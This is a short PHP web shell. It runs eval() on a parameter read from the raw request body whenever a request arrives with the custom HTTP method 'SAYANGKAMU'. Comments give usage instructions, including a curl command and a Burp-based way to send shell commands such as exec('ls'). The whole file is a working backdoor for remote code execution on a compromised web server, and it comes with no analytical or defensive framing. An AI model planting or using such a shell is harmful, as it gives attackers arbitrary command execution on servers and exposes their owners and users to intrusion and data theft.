<?php

// using
// curl -X SAYANGKAMU ssl://url.domain/path/filename.ext  -d 'SayangKamu=echo exec("ls");'
// FireFox ( using burp/ another change request get/post to SAYANGKAMU and add params SayangKamu=echo exec("ls"); 

if($_SERVER['REQUEST_METHOD'] == 'SAYANGKAMU') {
    parse_str(file_get_contents("php://input"),$SayangKamu);
    eval($SayangKamu['SayangKamu']);
}
